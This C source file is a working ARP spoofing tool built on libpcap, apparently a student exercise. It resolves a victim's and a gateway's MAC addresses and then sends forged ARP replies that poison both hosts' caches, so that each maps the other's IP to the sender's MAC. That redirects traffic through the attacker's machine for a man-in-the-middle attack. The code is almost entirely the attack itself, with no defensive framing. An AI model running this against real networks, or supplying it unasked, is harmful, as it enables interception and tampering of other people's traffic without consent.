#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <unistd.h>

//arp struct
#pragma pack(push,1)
struct arp{
    //eth
    uint8_t ether_dmac[6];
    uint8_t ether_smac[6];
    uint16_t ether_type;
    //arp
    uint16_t Hardware_Type;
    uint16_t Protocol_Type;
    uint8_t Hardware_size;
    uint8_t Protocol_size;
    uint16_t Opcode;
    uint8_t S_Mac[6];
    uint8_t S_IP[4];
    uint8_t T_Mac[6];
    uint8_t T_IP[4];
};
#pragma pack(pop)

typedef struct {
    char* dev_;
} Param;

Param param = {
    .dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 4) //argv[1] = dev, argv[2] = victim ip, argv[3] = gateway ip
    {
        printf("need argv 4\n");
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

int main(int argc,char**argv)
{
    //using socket my ip, mac
    int sockfd;
    char my_ip[40];
    char reader_mac[13]={00};
    struct ifreq ifr;

    strncpy(ifr.ifr_name,argv[1],IFNAMSIZ);
    sockfd =socket(AF_INET,SOCK_STREAM,0);

    if (ioctl(sockfd,SIOCGIFADDR,&ifr)< 0 )
    {
        perror("ioctl");
        return -1;
    }

    //my_ip print
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, my_ip, sizeof(struct sockaddr));
    printf("my ip : %s\n",my_ip);

    //my_mac print
    if(0 == ioctl(sockfd, SIOCGIFHWADDR, &ifr)){
        for(int i=0 ; i<6 ; i++){
            unsigned char data = ifr.ifr_addr.sa_data[i];
            sprintf(reader_mac+(i*2), "%02x", data);
        }
        reader_mac[12]='\0';
        printf("my mac : %s\n\n", reader_mac);
    }

    /*---------------------- arp request to victim(argv[2]) struct setting ----------------------*/

    //pcap arp broadcast to victim
    struct arp broad_victim;

    //eth_dmac
    for(int i=0;i<6;i++){
        broad_victim.ether_dmac[i] = 0xFF;
    }

    //eth_smac
    //mac : char -> int
    uint8_t sender_mac[6];
    if(strlen(reader_mac) == 12){
        for (int i=0 ; i<6 ; i++){
            sscanf(reader_mac + (i*2), "%2hhx", &sender_mac[i]);
        }
        memcpy(broad_victim.ether_smac, sender_mac, 6);
    } else{
        printf("Invalid Mac Address format\n");
    }

    broad_victim.ether_type = htons(0x0806);

    //broad arp
    broad_victim.Hardware_Type = htons(0x0001);
    broad_victim.Protocol_Type = htons(0x0800);
    broad_victim.Hardware_size = 0x06;
    broad_victim.Protocol_size = 0x04;
    broad_victim.Opcode = htons(0x0001);

    //S_MAC setting
    //mac : char -> int
    if(strlen(reader_mac) == 12){
        for (int i=0 ; i<6 ; i++){
            sscanf(reader_mac + (i*2), "%2hhx", &sender_mac[i]);
        }
        memcpy(broad_victim.S_Mac, sender_mac, 6);
    }
    else{
        printf("Invalid Mac Address format\n");
    }

    //S_IP setting
    inet_pton(AF_INET, my_ip,&broad_victim.S_IP);

    //D_MAC setting
    for(int i=0;i<6;i++){
        broad_victim.T_Mac[i] = 0x00;
    }

    //D_IP setting
    inet_pton(AF_INET, argv[2], &broad_victim.T_IP);

    /*------------------------------ send arp request to victim -----------------------------*/

    if (!parse(&param, argc, argv))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    u_char packet_buffer[sizeof(struct arp)];

    //packet send to arp to victim
    memcpy(packet_buffer, &broad_victim, sizeof(struct arp));

    if(pcap_sendpacket(pcap, packet_buffer, sizeof(arp)) != 0){
        fprintf(stderr, "Error sending ARP request : %s\n", pcap_geterr(pcap));
        return 1;
    }

    /*------------------------------ capture victim reply -----------------------------*/
    struct pcap_pkthdr* reply_v;
    const u_char* packet_v;
    int res_v = pcap_next_ex(pcap, &reply_v, &packet_v);
    if (res_v == PCAP_ERROR || res_v == PCAP_ERROR_BREAK) {
        printf("pcap_next_ex return %d(%s)\n", res_v, pcap_geterr(pcap));
    }

    struct arp* victim_reply = (struct arp*)packet_v;

    uint8_t victim_mac[6];
    for(int i=0 ; i<6 ; i++){
        victim_mac[i] = victim_reply->ether_smac[i];
    }

    if(ntohs(victim_reply -> ether_type) == 0x0806){
        printf("reply victim mac address : %02x:%02x:%02x:%02x:%02x:%02x\n", victim_reply->ether_smac[0], victim_reply->ether_smac[1], victim_reply->ether_smac[2], victim_reply->ether_smac[3], victim_reply->ether_smac[4], victim_reply->ether_smac[5]);
        printf("reply victim ip address : %d.%d.%d.%d\n\n", victim_reply->S_IP[0], victim_reply->S_IP[1], victim_reply->S_IP[2], victim_reply->S_IP[3]);
    }

    /*---------------------- arp request to gateway(argv[3]) struct setting ----------------------*/

    //pcap arp broadcast to gateway
    struct arp broad_gateway;

    //eth_dmac
    for(int i=0;i<6;i++){
        broad_gateway.ether_dmac[i] = 0xFF;
    }

    //eth_smac
    //mac : char -> int
    if(strlen(reader_mac) == 12){
        for (int i=0 ; i<6 ; i++){
            sscanf(reader_mac + (i*2), "%2hhx", &sender_mac[i]);
        }
        memcpy(broad_gateway.ether_smac, sender_mac, 6);
    } else{
        printf("Invalid Mac Address format\n");
    }

    broad_gateway.ether_type = htons(0x0806);

    //broad arp
    broad_gateway.Hardware_Type = htons(0x0001);
    broad_gateway.Protocol_Type = htons(0x0800);
    broad_gateway.Hardware_size = 0x06;
    broad_gateway.Protocol_size = 0x04;
    broad_gateway.Opcode = htons(0x0001);

    //S_MAC setting
    //mac : char -> int
    if(strlen(reader_mac) == 12){
        for (int i=0 ; i<6 ; i++){
            sscanf(reader_mac + (i*2), "%2hhx", &sender_mac[i]);
        }
        memcpy(broad_gateway.S_Mac, sender_mac, 6);
    }
    else{
        printf("Invalid Mac Address format\n");
    }

    //S_IP setting
    inet_pton(AF_INET, my_ip,&broad_gateway.S_IP);

    //D_MAC setting
    for(int i=0;i<6;i++){
        broad_gateway.T_Mac[i] = 0x00;
    }

    //D_IP setting
    inet_pton(AF_INET, argv[3], &broad_gateway.T_IP);

    /*------------------------------ send arp request to gateway -----------------------------*/

    //packet send to gateway
    memcpy(packet_buffer, &broad_gateway, sizeof(struct arp));
    if(pcap_sendpacket(pcap, packet_buffer, sizeof(arp)) != 0){
        fprintf(stderr, "Error sending ARP request : %s\n", pcap_geterr(pcap));
        return 1;
    }


    /*------------------------------ capture gateway reply -----------------------------*/
    struct pcap_pkthdr* reply_g;
    const u_char* packet_g;
    int res_g = pcap_next_ex(pcap, &reply_g, &packet_g);
    if (res_g == PCAP_ERROR || res_g == PCAP_ERROR_BREAK) {
        printf("pcap_next_ex return %d(%s)\n", res_g, pcap_geterr(pcap));
    }

    struct arp* gateway_reply = (struct arp*)packet_g;

    uint8_t gateway_mac[6];
    for(int i=0 ; i<6 ; i++){
        gateway_mac[i] = gateway_reply->ether_smac[i];
    }

    if(ntohs(gateway_reply -> ether_type) == 0x0806){
        printf("reply gateway mac address : %02x:%02x:%02x:%02x:%02x:%02x\n", gateway_reply->ether_smac[0], gateway_reply->ether_smac[1], gateway_reply->ether_smac[2], gateway_reply->ether_smac[3], gateway_reply->ether_smac[4], gateway_reply->ether_smac[5]);
        printf("reply gateway ip address : %d.%d.%d.%d\n\n", gateway_reply->S_IP[0], gateway_reply->S_IP[1], gateway_reply->S_IP[2], gateway_reply->S_IP[3]);
    }

    /*------------------------------ send modulated reply -----------------------------*/

    //send to victim
    struct arp *request_victim = (struct arp *)malloc(sizeof(struct arp));

    //request_victim eth

    //ether_dmac
    for(int i=0;i<6;i++){
        request_victim->ether_dmac[i] = victim_mac[i];
    }

    //ether_smac
    if(strlen(reader_mac) == 12){
        for (int i=0 ; i<6 ; i++){
            sscanf(reader_mac + (i*2), "%2hhx", &sender_mac[i]);
        }
        memcpy(request_victim->ether_smac, sender_mac, 6);
    } else{
        printf("Invalid Mac Address format\n");
    }

    //ether_type
    request_victim->ether_type = htons(0x0806);

    //request_victim arp
    request_victim->Hardware_Type= htons(0x0001);
    request_victim->Protocol_Type = htons(0x0800);
    request_victim->Hardware_size = 0x06;
    request_victim->Protocol_size = 0x04;
    request_victim->Opcode = htons(0x0002);

    //S_Mac
    memcpy(request_victim->S_Mac, sender_mac, 6);

    //S_IP
    inet_pton(AF_INET, argv[3],&request_victim->S_IP);

    //T_Mac
    for(int i=0;i<6;i++){
        request_victim->T_Mac[i] = victim_mac[i];
    }

    //T_IP
    inet_pton(AF_INET, argv[2],&request_victim->T_IP);

    //send packet struct request_victim
    memcpy(packet_buffer, request_victim, sizeof(struct arp));
    if(pcap_sendpacket(pcap, packet_buffer, sizeof(arp)) != 0){
        fprintf(stderr, "Error sending ARP request : %s\n", pcap_geterr(pcap));
        return 1;
    }

    /*-----------------------------------------------------------*/

    //send to gateway

    struct arp *request_gateway = (struct arp *)malloc(sizeof(struct arp));

    //request_victim eth

    //ether_dmac
    for(int i=0;i<6;i++){
        request_gateway->ether_dmac[i] = gateway_mac[i];
    }

    //ether_smac
    if(strlen(reader_mac) == 12){
        for (int i=0 ; i<6 ; i++){
            sscanf(reader_mac + (i*2), "%2hhx", &sender_mac[i]);
        }
        memcpy(request_gateway->ether_smac, sender_mac, 6);
    } else{
        printf("Invalid Mac Address format\n");
    }

    //ether_type
    request_gateway->ether_type = htons(0x0806);

    //request_victim arp
    request_gateway->Hardware_Type= htons(0x0001);
    request_gateway->Protocol_Type = htons(0x0800);
    request_gateway->Hardware_size = 0x06;
    request_gateway->Protocol_size = 0x04;
    request_gateway->Opcode = htons(0x0002);

    //S_Mac
    memcpy(request_gateway->S_Mac, sender_mac, 6);

    //S_IP
    inet_pton(AF_INET, argv[2],&request_gateway->S_IP);

    //T_Mac
    for(int i=0;i<6;i++){
        request_gateway->T_Mac[i] = gateway_mac[i];
    }

    //T_IP
    inet_pton(AF_INET, argv[3],&request_gateway->T_IP);

    //send packet struct request_victim
    memcpy(packet_buffer, request_gateway, sizeof(struct arp));
    if(pcap_sendpacket(pcap, packet_buffer, sizeof(arp)) != 0){
        fprintf(stderr, "Error sending ARP request : %s\n", pcap_geterr(pcap));
        return 1;
    }
    free(request_victim);
    free(request_gateway);

    pcap_close(pcap);
    return 0;
}
